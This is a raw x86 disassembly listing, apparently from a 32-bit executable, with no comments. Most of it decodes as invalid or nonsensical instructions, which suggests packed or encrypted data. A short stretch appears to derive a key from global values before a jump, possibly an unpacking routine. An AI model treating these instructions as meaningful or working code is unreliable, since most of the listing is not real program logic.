  4099f0:	sar    DWORD PTR [ebp+0x67],1
  4099f3:	ds mov ebp,0xfa20501
  4099f9:	out    dx,al
  4099fa:	xor    DWORD PTR [eax-0x42],0x53
  4099fe:	test   BYTE PTR [esi+0x18],cl
  409a01:	jno    0x4099a9
  409a03:	fnstsw WORD PTR [edx]
  409a05:	push   0xe48220e6
  409a0a:	stos   DWORD PTR es:[edi],eax
  409a0b:	or     DWORD PTR [edx+ecx*4-0x16],eax
  409a0f:	push   ss
  409a10:	sbb    eax,0x31c7049f
  409a15:	(bad)
  409a18:	repnz fwait
  409a1a:	pop    ss
  409a1b:	mov    cs,WORD PTR [ecx-0x6a2c325b]
  409a21:	inc    ebp
  409a22:	xor    eax,0x6b5bcfdd
  409a27:	mov    esp,0x4e58766
  409a2c:	pop    ss
  409a2d:	fs jmp 0x3d31:0xced13aaa
  409a35:	retf   0x6c51
  409a38:	je     0x4099da
  409a3a:	test   BYTE PTR [ebp-0x3aa9241f],dl
  409a40:	outs   dx,BYTE PTR ds:[esi]
  409a41:	jp     0x4099d8
  409a43:	int3   
  409a44:	sbb    eax,0xb1df25d1
  409a49:	(bad)  
  409a4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a4b:	adc    BYTE PTR [ecx+ecx*8+0x14b308a7],bl
  409a52:	in     eax,0x65
  409a54:	ins    BYTE PTR es:[edi],dx
  409a55:	sbb    DWORD PTR [ecx],ebx
  409a57:	jmp    0xa811f5bd
  409a5c:	jmp    0x409a30
  409a5e:	jg     0x409a20
  409a60:	data16 shr dl,cl
  409a63:	fsubr  QWORD PTR [ebx+eax*8+0x6eda19c6]
  409a6a:	enter  0x969d,0x19
  409a6e:	sar    DWORD PTR [esi-0x39f8891f],cl
  409a74:	clc    
  409a75:	(bad)  
  409a76:	iret   
  409a77:	add    BYTE PTR [eax+ecx*2],0x72
  409a7b:	lahf   
  409a7c:	scas   al,BYTE PTR es:[edi]
  409a7d:	lods   eax,DWORD PTR ds:[esi]
  409a7e:	jg     0x409a4d
  409a80:	pop    ss
  409a81:	stos   BYTE PTR es:[edi],al
  409a82:	repnz inc esi
  409a84:	dec    eax
  409a85:	mov    eax,ds:0xd6203588
  409a8a:	call   0x1688f9b8
  409a8f:	(bad)  
  409a90:	mov    al,ds:0xf0f4541a
  409a95:	pop    ebx
  409a96:	jbe    0x409a40
  409a98:	adc    eax,0xf1b0f275
  409a9d:	loope  0x409b13
  409a9f:	fiadd  WORD PTR [ebx]
  409aa1:	test   DWORD PTR ds:0x86591559,ecx
  409aa7:	test   DWORD PTR [esi],0xea58377e
  409aad:	cmp    DWORD PTR [ebp-0xcc66d22],edx
  409ab3:	mov    ch,0xe3
  409ab5:	inc    esi
  409ab6:	sbb    DWORD PTR [eax+0x79],0x27
  409aba:	inc    eax
  409abb:	cli    
  409abc:	mov    al,ds:0xef921748
  409ac1:	mov    ch,0x39
  409ac3:	xchg   ecx,eax
  409ac4:	jmp    0x543f2be0
  409ac9:	mov    ebp,ds
  409acb:	lds    esi,FWORD PTR [edi-0x1c972f72]
  409ad1:	fadd   st(2),st
  409ad3:	add    eax,0xded5d91f
  409ad8:	test   DWORD PTR [esi+0x73],ecx
  409adb:	cmp    DWORD PTR [edx+0x29c1b2bd],edi
  409ae1:	retf   
  409ae2:	shl    DWORD PTR [ecx],1
  409ae4:	das    
  409ae5:	xor    al,BYTE PTR [edi-0x3827af35]
  409aeb:	push   esp
  409aec:	and    eax,0x453c5d65
  409af1:	inc    esi
  409af2:	aam    0x20
  409af4:	pop    esi
  409af5:	or     BYTE PTR [ebx+0x51d4b563],ah
  409afb:	pop    edi
  409afc:	xor    BYTE PTR [edx+0x5a],ch
  409aff:	mov    BYTE PTR [edi],bh
  409b01:	fld    DWORD PTR [edi+0x0]
  409b04:	push   esi
  409b05:	inc    edx
  409b06:	not    BYTE PTR [edi]
  409b08:	mov    dh,0x89
  409b0a:	shr    DWORD PTR [ebx],1
  409b0c:	mov    edi,0x9ddb5bd
  409b11:	jnp    0x409b50
  409b13:	sub    al,0x39
  409b15:	shl    BYTE PTR [edi+ecx*4],0x1a
  409b19:	out    0x33,al
  409b1b:	pop    ds
  409b1c:	ja     0x409b64
  409b1e:	(bad)  
  409b20:	mov    bl,al
  409b22:	jle    0x409abe
  409b24:	push   edx
  409b25:	test   BYTE PTR [edi-0x39],bl
  409b28:	xchg   esi,eax
  409b29:	add    DWORD PTR [ebp+0xeeb7f7d],edi
  409b2f:	mov    ebp,0x7f36ee76
  409b34:	xchg   bl,ch
  409b36:	push   edx
  409b37:	inc    ebx
  409b38:	(bad)  
  409b39:	in     ax,dx
  409b3b:	xor    eax,0x479eb6dd
  409b40:	inc    ecx
  409b41:	cmc    
  409b42:	cmp    eax,0xbda6e670
  409b47:	sub    al,0xfd
  409b49:	in     eax,dx
  409b4a:	push   ebp
  409b4b:	scas   eax,DWORD PTR es:[edi]
  409b4c:	hlt    
  409b4d:	int    0x12
  409b4f:	imul   esp,ecx,0x16
  409b52:	(bad)  
  409b53:	out    dx,eax
  409b54:	xchg   edi,eax
  409b55:	in     al,dx
  409b56:	mov    ebp,0xfcf53274
  409b5b:	ins    BYTE PTR es:[edi],dx
  409b5c:	xchg   DWORD PTR [ebp+0x592a5e1f],esi
  409b62:	sub    cl,ah
  409b64:	mov    DWORD PTR ds:0x7b0ee27b,ebx
  409b6a:	sub    DWORD PTR [ecx+0x1529c045],ecx
  409b70:	add    DWORD PTR [ebp+0x43],0x0
  409b74:	mov    eax,0x7510851
  409b79:	mov    edi,DWORD PTR ds:0x4344df
  409b7f:	or     DWORD PTR ds:0x43454f,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x43457f
  409b8f:	xor    DWORD PTR ds:0x434583,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x43456b
  409bb7:	mov    edi,DWORD PTR ds:0x434623
  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	iret   
  409bd4:	aad    0x23
  409bd6:	ror    DWORD PTR [esi+0x707e7eea],cl
  409bdc:	jns    0x409c5c
  409bde:	jle    0x409bbf
  409be0:	in     eax,dx
  409be1:	mov    ebp,0xf74d8dfd
  409be6:	inc    eax
  409be7:	mov    edi,0x1b80ba56
  409bec:	jmp    DWORD PTR [eax+0x30cd868a]
  409bf2:	add    DWORD PTR [edx-0x12],0xffffffc3
  409bf6:	mov    ch,0x57
  409bf8:	in     al,0x9b
  409bfa:	inc    ebx
  409bfb:	shr    BYTE PTR [ecx-0x18309617],0x18
  409c02:	push   esi
  409c03:	test   dl,0x93
  409c06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c07:	popa   
  409c08:	pop    ecx
  409c09:	sahf   
  409c0a:	push   eax
  409c0b:	ins    DWORD PTR es:[edi],dx
  409c0c:	jecxz  0x409b93
  409c0e:	scas   eax,DWORD PTR es:[edi]
  409c0f:	lods   eax,DWORD PTR ds:[esi]
  409c10:	test   BYTE PTR [ebp-0x6abb123a],dh
  409c16:	adc    al,0xe7
  409c18:	loopne 0x409c1c
  409c1a:	push   eax
  409c1b:	xchg   edx,eax
  409c1c:	test   al,0x1c
  409c1e:	mov    eax,ds:0xa2fcb9a9
  409c23:	inc    esi
  409c24:	jecxz  0x409c79
  409c26:	push   eax
  409c27:	call   0xdfc47569
  409c2c:	and    eax,0xf078da7e
  409c31:	pop    edx
  409c32:	mov    eax,ds:0xdd938323
  409c37:	punpckhwd mm6,QWORD PTR [edx-0x6c]
  409c3b:	pushf  
  409c3c:	aam    0x5e
  409c3e:	mov    ecx,0xdb62a491
  409c43:	in     al,0x5a
  409c45:	cmc    
  409c46:	ja     0x409ca8
  409c48:	mov    ds:0x3fceb637,eax
  409c4d:	cmp    eax,0x1f7e4c96
  409c52:	pushf  
  409c53:	cmp    al,0xce
  409c56:	ret    0x32e8
  409c59:	aam    0xb1
  409c5b:	and    al,0xb1
  409c5d:	cmp    al,0x51
  409c5f:	inc    edx
  409c60:	sahf   
  409c61:	push   edi
  409c62:	sbb    edi,DWORD PTR [esi+0x22]
  409c65:	fcom   st(4)
  409c67:	call   0x319b:0x65905291
  409c6e:	cld    
  409c6f:	ficom  DWORD PTR [edi+ebp*1-0x1f052baf]
  409c76:	or     ebx,DWORD PTR [ebx]
  409c78:	dec    edx
  409c79:	jns    0x409c3c
  409c7b:	push   es
  409c7c:	nop
  409c7d:	add    al,0x55
  409c7f:	rcr    DWORD PTR [eax],0x36
  409c82:	out    dx,al
  409c83:	pop    edx
  409c84:	call   0xcdfd27e6
  409c89:	jmp    0x409cc0
  409c8b:	dec    esp
  409c8c:	(bad)  
  409c8d:	push   esi
  409c8e:	shl    BYTE PTR [eax],1
  409c90:	into   
  409c91:	sbb    eax,0x8fd93e70
  409c96:	sbb    DWORD PTR [eax],esp
  409c98:	mov    BYTE PTR [ebx-0x6ff24371],al
  409c9e:	push   ds
  409c9f:	int    0x36
  409ca1:	sub    eax,0x27ef3fb6
  409ca6:	sub    BYTE PTR [edx],ah
  409ca8:	push   ss
  409ca9:	dec    esp
  409caa:	(bad)  
  409cac:	aas    
  409cad:	fisttp WORD PTR [edx-0x45a852eb]
  409cb3:	js     0x409d20
  409cb5:	cmp    BYTE PTR [ecx-0x375c7d8e],bl
  409cbb:	xor    eax,0x190c86f2
  409cc0:	jnp    0x409d1e
  409cc2:	sbb    DWORD PTR [esi+0x40fd2a66],ecx
  409cc8:	inc    edi
  409cc9:	(bad)  
  409cca:	call   0x8320:0x8667321
  409cd1:	fist   WORD PTR [eax+0x2b]
  409cd4:	popa   
  409cd5:	sub    ecx,eax
  409cd7:	push   0x24757238
  409cdc:	sub    DWORD PTR [esi],eax
  409cde:	add    DWORD PTR [ebp+ebx*1-0x1a],esi
  409ce2:	xchg   ebx,eax
  409ce3:	pop    ss
  409ce4:	xor    ebp,esi
  409ce6:	sbb    BYTE PTR [ecx+0x2c],0x7b
  409cea:	iret   
  409ceb:	addr16 sbb eax,0x67dac75a
  409cf1:	stos   DWORD PTR es:[edi],eax
  409cf2:	ss iret 
  409cf4:	mov    ds:0x4f5c1735,al
  409cf9:	cmp    BYTE PTR [esi],ah
  409cfb:	dec    edx
  409cfc:	adc    eax,0xca4b0ede
  409d01:	and    BYTE PTR [edi],al
  409d03:	stos   DWORD PTR es:[edi],eax
  409d04:	in     eax,0x45
  409d06:	les    esi,FWORD PTR [eax-0x5c55d10e]
  409d0c:	xchg   ebx,eax
  409d0d:	imul   ebp,ebx,0xffffffc3
  409d10:	popa   
  409d11:	xchg   ecx,eax
  409d12:	not    esi
  409d14:	push   ds
  409d15:	rcr    DWORD PTR [eax],0x9f
  409d18:	mov    ecx,0xfaa27974
  409d1d:	cmp    bh,dh
  409d1f:	inc    ebx
  409d20:	inc    esi
  409d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d22:	add    DWORD PTR [esi],edi
  409d24:	out    dx,al
  409d25:	ret    0x7da0
  409d28:	and    al,0x4c
  409d2a:	xchg   edx,eax
  409d2b:	mov    DWORD PTR [edi+esi*4+0x20a894dd],edx
  409d32:	jne    0x409cf7
  409d34:	or     al,0x51
  409d36:	push   eax
  409d37:	or     dh,al
  409d39:	das    
  409d3a:	mov    WORD PTR [edx+0x479d1637],fs
  409d40:	in     al,0xcd
  409d42:	sbb    eax,0xd9ef855b
  409d47:	aam    0x6d
  409d49:	inc    edx
  409d4a:	shr    BYTE PTR [eax],cl
  409d4c:	sbb    DWORD PTR [ebx],esi
  409d4e:	outs   dx,DWORD PTR ds:[esi]
  409d4f:	sbb    al,0x2f
  409d51:	(bad)
  409d56:	(bad)  
  409d57:	cmc    
  409d58:	cmc    
  409d59:	mov    al,ds:0xaea2d3a5
  409d5e:	xabort 0xf3
  409d61:	push   eax
  409d62:	xor    eax,DWORD PTR [esp+ebx*1]
  409d65:	push   edi
  409d66:	dec    ebx
  409d67:	fucomi st,st(5)
  409d69:	(bad)  [eax+edi*4+0x70]
  409d6d:	(bad)  
  409d6e:	rol    BYTE PTR [eax+0x60],0xe8
  409d72:	xchg   DWORD PTR [esi-0x77],esi
  409d75:	and    eax,0xf43efd4d
  409d7a:	jge    0x409cfe
  409d7c:	jno    0x409d82
  409d7e:	lahf   
  409d7f:	out    dx,al
  409d80:	ja     0x409d03
  409d82:	ss dec esp
  409d84:	es mov ch,0xe4
  409d87:	lea    ebx,[ecx]
  409d89:	mov    dh,0x4d
  409d8b:	fnstsw WORD PTR [edi-0x78]
  409d8e:	loope  0x409d12
  409d90:	mov    dh,0xa4
  409d92:	clc    
  409d93:	adc    BYTE PTR [edi+0x1c3352f5],bl
  409d99:	cmp    al,dh
  409d9b:	adc    esi,ebx
  409d9d:	shr    BYTE PTR [edi+esi*4+0x26],1
  409da1:	enter  0x329a,0x1c
  409da5:	arpl   WORD PTR [edx+esi*4-0x1348878e],sp
  409dac:	push   edi
  409dad:	sub    BYTE PTR [ebp+0x6137c5d8],dh
  409db3:	call   0x2c3dbe1
  409db8:	ins    BYTE PTR es:[edi],dx
  409db9:	pusha  
  409dba:	fnstsw WORD PTR [ecx-0x37b8d1b5]
  409dc0:	cmp    dl,BYTE PTR [edx+ecx*2-0x4f]
  409dc4:	jo     0x409d62
  409dc6:	push   si
  409dc8:	jl     0x409df8
  409dca:	sub    eax,0x46abdd28
  409dcf:	and    eax,0x1ad1c62e
  409dd4:	lea    ebx,[edi]
  409dd6:	push   ebp
  409dd7:	mov    ebp,edi
  409dd9:	dec    edx
  409dda:	adc    bl,dl
  409ddc:	push   ebp
  409ddd:	adc    DWORD PTR [edi+0x2e2c8d9e],esp
  409de3:	repz pushf 
  409de5:	and    DWORD PTR [esi],ebp
  409de7:	sbb    al,0x10
  409de9:	ds lahf 
  409deb:	add    BYTE PTR [edi-0x4f],bh
  409dee:	(bad)  [ebp+0x1fe002d6]
  409df4:	and    al,0x89
  409df6:	mov    ds,WORD PTR ds:0x89b50981
  409dfc:	and    DWORD PTR [edx],0x7e
  409dff:	add    eax,0x8786cb34
  409e04:	pop    ecx
  409e05:	add    al,0xcc
  409e07:	xchg   ebx,eax
  409e08:	cli    
  409e09:	xchg   ecx,eax
  409e0a:	xor    BYTE PTR [edx+0x475635cb],bl
  409e10:	ins    BYTE PTR es:[edi],dx
  409e11:	ficomp WORD PTR [esi+0x31]
  409e14:	mov    dl,0x84
  409e16:	mov    ebx,0x8541cd8d
  409e1b:	xor    DWORD PTR [ebp-0x1f],eax
  409e1e:	xchg   esp,edx
  409e20:	dec    ebx
  409e21:	mov    WORD PTR [edx-0x8],?
  409e24:	jns    0x409e5c
  409e26:	js     0x409dde
  409e28:	xchg   ecx,eax
  409e29:	ins    BYTE PTR es:[edi],dx
  409e2a:	adc    BYTE PTR [edi],bl
  409e2c:	add    BYTE PTR [ebx],al
  409e2e:	mov    dh,0x22
  409e30:	icebp  
  409e31:	xchg   ebp,eax
  409e32:	leave  
  409e33:	jbe    0x409e80
  409e35:	sub    ah,cl
  409e37:	adc    BYTE PTR [ebx+0x1f],bl
  409e3a:	add    dl,BYTE PTR [ebx+0x11]
  409e3d:	cdq    
  409e3e:	loopne 0x409e8c
  409e40:	mov    dl,bh
  409e42:	dec    BYTE PTR [edi-0x41]
  409e45:	dec    ebx
  409e46:	adc    al,0x38
  409e48:	cmp    edx,DWORD PTR [esi+0x6e5c960d]
  409e4e:	add    BYTE PTR [ecx+ecx*1+0x5ec78c24],ch
  409e55:	xor    DWORD PTR ds:0xcb9b5886,edx
  409e5b:	push   esi
  409e5c:	cmp    dh,al
  409e5e:	mov    al,ds:0xb30bb16b
  409e63:	add    edx,DWORD PTR [esp+ebp*1]
  409e66:	shr    DWORD PTR [ecx-0x2b5226f0],cl
  409e6c:	repnz rcr DWORD PTR [ecx+eax*2+0x53e9a572],0x38
  409e75:	data16 adc bl,ah
  409e78:	cmp    bh,dh
  409e7a:	test   BYTE PTR [edi-0x2b],dl
  409e7d:	addr16 mov esi,0x60765f3a
  409e83:	ja     0x409e18
  409e85:	mov    edi,0x1101eb6b
  409e8a:	ds jo  0x409eea
  409e8d:	(bad)  
  409e8e:	call   0x8d1ada7b
  409e93:	aas    
  409e94:	lods   eax,DWORD PTR ds:[esi]
  409e95:	aas    
  409e96:	inc    ecx
  409e97:	dec    edi
  409e98:	push   esi
  409e99:	mov    ebx,0x1ba5e877
  409e9e:	sub    edi,DWORD PTR [eax+eiz*8+0x71]
  409ea2:	fimul  DWORD PTR [edx+ebx*2-0x4de63d20]
  409ea9:	add    eax,0xe63bca19
  409eae:	sub    al,BYTE PTR [ecx]
  409eb0:	aaa    
  409eb1:	add    al,0x2a
  409eb3:	cdq    
  409eb4:	jns    0x409e57
  409eb6:	cld    
  409eb7:	sbb    ah,BYTE PTR [edi+0x3c]
  409eba:	inc    edx
  409ebb:	es mov edi,0x7ea33c00
  409ec1:	ror    DWORD PTR [ecx-0x47],1
  409ec4:	bt     DWORD PTR [ebx+0x1ed88aac],edx
  409ecb:	fisub  WORD PTR [edx]
  409ecd:	mov    ds:0x84820d9,eax
  409ed2:	adc    ecx,esp
  409ed4:	loop   0x409f1b
  409ed6:	sti    
  409ed7:	test   DWORD PTR [edx-0x3],edx
  409eda:	mov    ebx,0xd3836894
  409edf:	fimul  DWORD PTR [eax-0x5b89c1d9]
  409ee5:	inc    ebx
  409ee6:	jns    0x409f52
  409ee8:	inc    ebx
  409ee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eea:	in     al,0x33
  409eec:	inc    esp
  409eed:	push   cs
  409eee:	cmc    
  409eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ef0:	nop
  409ef1:	jecxz  0x409f1c
  409ef3:	mov    esp,DWORD PTR es:[edi+0x30]
  409ef7:	test   DWORD PTR [eax-0x51],eax
  409efa:	mov    ?,WORD PTR [edx+ecx*1]
  409efd:	add    dh,BYTE PTR [eax-0x4b794e94]
  409f03:	jg     0x409ead
  409f05:	clc    
  409f06:	jmp    0xc325:0x178acb2d
  409f0d:	sbb    al,0x13
  409f0f:	inc    esi
  409f10:	sahf   
  409f11:	pop    eax
  409f12:	add    eax,0xa77f4fd9
  409f17:	in     eax,dx
  409f18:	add    al,BYTE PTR [esi-0x2f4697b2]
  409f1e:	test   DWORD PTR [eax],edx
  409f20:	pushf  
  409f21:	inc    eax
  409f22:	mov    ebp,0x399bd6fe
  409f27:	mov    esi,0xee9577dd
  409f2c:	out    dx,al
  409f2d:	ins    DWORD PTR es:[edi],dx
  409f2e:	shl    DWORD PTR ds:0x5b050100,cl
  409f34:	lock iret 
  409f36:	retf   
  409f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f38:	out    0xe7,al
  409f3a:	neg    DWORD PTR [edi+0x3b]
  409f3d:	push   edx
  409f3e:	adc    DWORD PTR [ebp+edi*4-0x395079db],0xfffffff8
  409f46:	or     eax,0x4deda2ed
  409f4b:	mov    edx,DWORD PTR [eax+esi*2-0x2b]
  409f4f:	lahf   
  409f50:	mov    al,ds:0x62c91718
  409f55:	repnz lea edx,[eax]
  409f58:	xchg   BYTE PTR [ebp+ebx*2+0x1],ch
  409f5c:	mov    edi,0xd3a639cd
  409f61:	fwait
  409f62:	out    dx,eax
  409f63:	inc    edx
  409f64:	pop    edx
  409f65:	dec    esp
  409f66:	sub    BYTE PTR [edx-0x34],dl
  409f69:	xor    ebx,DWORD PTR [eax-0x76]
  409f6c:	sahf   
  409f6d:	leave  
  409f6e:	inc    eax
  409f6f:	xchg   esi,eax
  409f70:	repz repz test ecx,ecx
  409f74:	and    BYTE PTR [edx],dl
  409f76:	or     eax,0x87bf158b
  409f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f7c:	mov    dh,0xa
  409f7e:	dec    esp
  409f7f:	xchg   edi,eax
  409f80:	ja     0x409f94
  409f82:	cwde   
  409f83:	das    
  409f84:	jo     0x409fab
  409f86:	jnp    0x409f95
  409f88:	sar    DWORD PTR [edi+0x5c],1
  409f8b:	dec    ecx
  409f8c:	jle    0x409fda
  409f8e:	ror    DWORD PTR [ebx],1
  409f90:	pop    eax
  409f91:	mov    al,0xdc
  409f93:	test   BYTE PTR [ebx],bh
  409f95:	jmp    0x409fd3
  409f97:	pop    esp
  409f98:	inc    ecx
  409f99:	and    ebx,eax
  409f9b:	out    0xe1,al
  409f9d:	pop    ebx
  409f9e:	gs ins DWORD PTR es:[edi],dx
  409fa0:	xor    ch,cl
  409fa2:	pop    eax
  409fa3:	das    
  409fa4:	in     eax,0xf5
  409fa6:	xchg   ebx,eax
  409fa7:	cmp    eax,0xe0b9bf8a
  409fac:	sbb    esi,edx
  409fae:	sub    al,0x60
  409fb0:	not    BYTE PTR ds:0xa9a87eb
  409fb6:	out    0xcf,eax
  409fb8:	or     ebx,DWORD PTR [edi+ecx*1]
  409fbb:	shl    BYTE PTR [ecx-0x2d],0xc8
  409fbf:	dec    esp
  409fc0:	mov    ds:0x88d9bd67,al
  409fc5:	ret    0x5dd6
  409fc8:	gs popf 
  409fca:	mov    ecx,0x6c20b398
  409fcf:	fidivr WORD PTR [edx]
  409fd1:	pop    esp
  409fd2:	lds    ecx,FWORD PTR [eax+0x368d6cf1]
  409fd8:	mov    edi,eax
  409fda:	inc    ebp
  409fdb:	fdivr  DWORD PTR [eax]
  409fdd:	test   DWORD PTR [eax+edi*8+0x12e9ff23],ebx
  409fe4:	add    al,0x0
  409fe6:	add    BYTE PTR [ecx+0x6b],ah
  409fe9:	in     al,dx
  409fea:	(bad)  
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	(bad)  
  409ff4:	dec    edi
  409ff5:	dec    ecx
  409ff6:	or     DWORD PTR [eax+0x707e7ef6],eax
  409ffc:	jns    0x40a07c
  409ffe:	jle    0x409fba
  40a000:	fdiv   st,st(1)
  40a002:	cmp    ecx,esi
  40a004:	loop   0x409fea
  40a006:	test   ebx,ecx
  40a008:	adc    esi,DWORD PTR [ebx+0x5]
  40a00b:	std    
  40a00c:	fwait
  40a00d:	in     eax,0x2a
  40a00f:	inc    esi
  40a010:	in     eax,0x5f
  40a012:	cmp    eax,0x1c202f0e
  40a017:	daa    
  40a018:	mov    BYTE PTR [edi+0xd9883b3],ah
  40a01e:	jb     0x40a09d
  40a020:	mov    BYTE PTR [ebx],al
  40a022:	xchg   ebp,eax
  40a023:	cmp    DWORD PTR [ecx+0x29d223f2],ebp
  40a029:	test   edx,edx
  40a02b:	fisub  WORD PTR [esi]
  40a02d:	(bad)  
  40a02f:	and    eax,0x6bd72f69
  40a034:	and    eax,ebp
  40a036:	pop    edx
  40a037:	inc    esi
  40a038:	cdq    
  40a039:	sbb    ch,BYTE PTR [edi+0x74b2b2f7]
  40a03f:	xchg   DWORD PTR [eax-0x3ab2ce90],eax
  40a045:	idiv   BYTE PTR [ecx+esi*2+0x27]
  40a049:	(bad)  
  40a04a:	sub    al,0x3
  40a04c:	imul   esp,eax,0xd519efc4
  40a052:	in     al,dx
  40a053:	or     BYTE PTR [eax-0x35b13801],bl
  40a059:	mov    edi,0x38d598a4
  40a05e:	jmp    0x40a013
  40a060:	imul   ebp,DWORD PTR [ecx],0x181f60b2
  40a066:	mov    edx,0xf059ba91
  40a06b:	mov    edx,ebx
  40a06d:	xchg   ecx,eax
  40a06e:	mov    al,ds:0x35327157
  40a073:	div    DWORD PTR [ebx+ecx*1]
  40a076:	jl     0x40a0ee
  40a078:	sar    DWORD PTR [ebp-0x53],0x9d
  40a07c:	fbld   TBYTE PTR [esi]
  40a07e:	sar    DWORD PTR es:[eax+0xd],cl
  40a082:	cwde   
  40a083:	dec    BYTE PTR [edi]
  40a085:	or     DWORD PTR [eax+0x4d3d97c6],ebx
  40a08b:	lock mov esp,0x22225298
  40a091:	in     al,dx
  40a092:	or     cl,BYTE PTR [eax+0x5e]
  40a095:	jns    0x40a0fe
  40a097:	imul   esi,DWORD PTR [ecx],0x4e
  40a09a:	retf   
  40a09b:	jmp    0xfa2b:0xe6db207c
  40a0a2:	std    
  40a0a3:	push   edi
  40a0a4:	xchg   ebp,eax
  40a0a5:	xchg   DWORD PTR [edx],edx
  40a0a7:	mov    edi,0x1a29a5c7
  40a0ad:	sbb    eax,0x36c6122
  40a0b2:	xchg   esi,eax
  40a0b3:	sub    BYTE PTR [ebx-0x3e],ah
  40a0b6:	(bad)  
  40a0b7:	mov    WORD PTR [ecx-0x3c3a5ba3],fs
  40a0bd:	(bad)  
  40a0be:	shl    DWORD PTR [ebx-0x34],0x27
  40a0c2:	ins    DWORD PTR es:[edi],dx
  40a0c3:	lock test al,0xf1
  40a0c6:	pop    es
  40a0c7:	xchg   esi,eax
  40a0c8:	and    eax,0x3bfdf657
  40a0cd:	and    edi,DWORD PTR [esi-0xb878be8]
  40a0d3:	mov    es:0x28cf2175,al
  40a0d9:	cmp    DWORD PTR [ecx+edx*4],ecx
  40a0dc:	scas   eax,DWORD PTR es:[edi]
  40a0dd:	cwde   
  40a0de:	imul   ebp,DWORD PTR [ecx],0x8
  40a0e1:	adc    cl,bh
  40a0e3:	mov    edx,0x57ee7a2a
  40a0e8:	int    0x76
  40a0ea:	stc    
  40a0eb:	les    ecx,FWORD PTR [ebp-0x2e9277d3]
  40a0f1:	icebp  
  40a0f2:	and    ah,BYTE PTR [edx+0x35]
  40a0f5:	repnz das 
  40a0f7:	and    al,BYTE PTR [ecx]
  40a0f9:	cmp    al,0xd6
  40a0fb:	test   ch,0xf3
  40a0fe:	not    ecx
  40a100:	out    dx,al
  40a101:	sar    BYTE PTR [edx],0xa6
  40a104:	pop    ebx
  40a105:	sub    ah,BYTE PTR [ebp+esi*2+0x16]
  40a109:	pop    es
  40a10a:	rcr    bh,1
  40a10c:	mov    ch,ch
  40a10e:	fwait
  40a10f:	call   0x5cae8680
  40a114:	or     al,0x4c
  40a116:	sub    esi,ebp
  40a118:	add    DWORD PTR [eax-0x3c9c25e2],eax
  40a11e:	jge    0x40a113
  40a120:	shl    BYTE PTR [ecx+0x69188083],0x6b
  40a127:	dec    ecx
  40a128:	aaa    
  40a129:	aad    0xea
  40a12b:	xchg   esi,eax
  40a12c:	scas   eax,DWORD PTR es:[edi]
  40a12d:	sub    eax,0xa85c3d23
  40a132:	xor    eax,0x2e7de984
  40a137:	lods   eax,DWORD PTR ds:[esi]
  40a138:	or     eax,0x6b5173b6
  40a13d:	pop    esi
  40a13e:	mov    bh,0x87
  40a140:	mov    ah,0x88
  40a142:	mov    edx,0x82f17e44
  40a147:	mov    eax,ds:0x6579aa88
  40a14c:	dec    ebp
  40a14d:	push   ebx
  40a14e:	ins    DWORD PTR es:[edi],dx
  40a14f:	adc    BYTE PTR [eax+0x45],bl
  40a152:	loope  0x40a1bf
  40a154:	mov    es,edi
  40a156:	dec    eax
  40a157:	and    bl,BYTE PTR [edx]
  40a159:	pop    ebx
  40a15a:	out    0x55,al
  40a15c:	test   al,0x93
  40a15e:	push   cs
  40a15f:	xchg   DWORD PTR [ecx+eax*1],edi
  40a162:	push   edi
  40a163:	dec    esp
  40a164:	jae    0x40a1b8
  40a166:	clc    
  40a167:	lahf   
  40a168:	dec    esi
  40a169:	add    DWORD PTR [ecx+0x7e8317a8],ebp
  40a16f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a170:	mov    cl,0x9c
  40a172:	dec    ecx
  40a173:	cmp    bh,ch
  40a175:	sub    al,0xcd
  40a177:	int    0x22
  40a179:	mov    ch,0xa5
  40a17b:	fldl2e 
  40a17d:	sahf   
  40a17e:	mov    ds:0x5f78dd59,eax
  40a183:	and    DWORD PTR [esi-0x43],ebx
  40a186:	add    al,0x28
  40a188:	mov    ecx,0x203d621a
  40a18d:	cmp    ebp,edx
  40a18f:	mov    ah,0xd4
  40a191:	sub    eax,0xd20f33df
  40a196:	jmp    0x7468:0xa61e54a6
  40a19d:	xor    al,0x16
  40a19f:	jb     0x40a1ee
  40a1a1:	and    eax,0xed5c85cb
  40a1a6:	aaa    
  40a1a7:	aad    0x72
  40a1a9:	xor    esp,DWORD PTR [edx+0x6900cf1b]
  40a1af:	leave  
  40a1b0:	xor    DWORD PTR [ebp+0x54],edi
  40a1b3:	xor    ebx,DWORD PTR [eax+ebx*4+0x53]
  40a1b7:	xor    esp,DWORD PTR ds:0x994965c9
  40a1bd:	sbb    al,0x77
  40a1bf:	mov    ebx,0x71cf602b
  40a1c4:	fist   DWORD PTR [edx-0x68cd3ad2]
  40a1ca:	ficomp WORD PTR [ebx+esi*4]
  40a1cd:	int    0x28
  40a1cf:	jl     0x40a166
  40a1d1:	inc    ecx
  40a1d2:	push   es
  40a1d3:	sub    eax,0xedfce61b
  40a1d8:	or     ecx,esi
  40a1da:	(bad)  
  40a1db:	into   
  40a1dc:	push   0xfffffff6
  40a1de:	ja     0x40a1a9
  40a1e0:	(bad)  
  40a1e1:	pop    ss
  40a1e2:	push   ds
  40a1e3:	shl    al,1
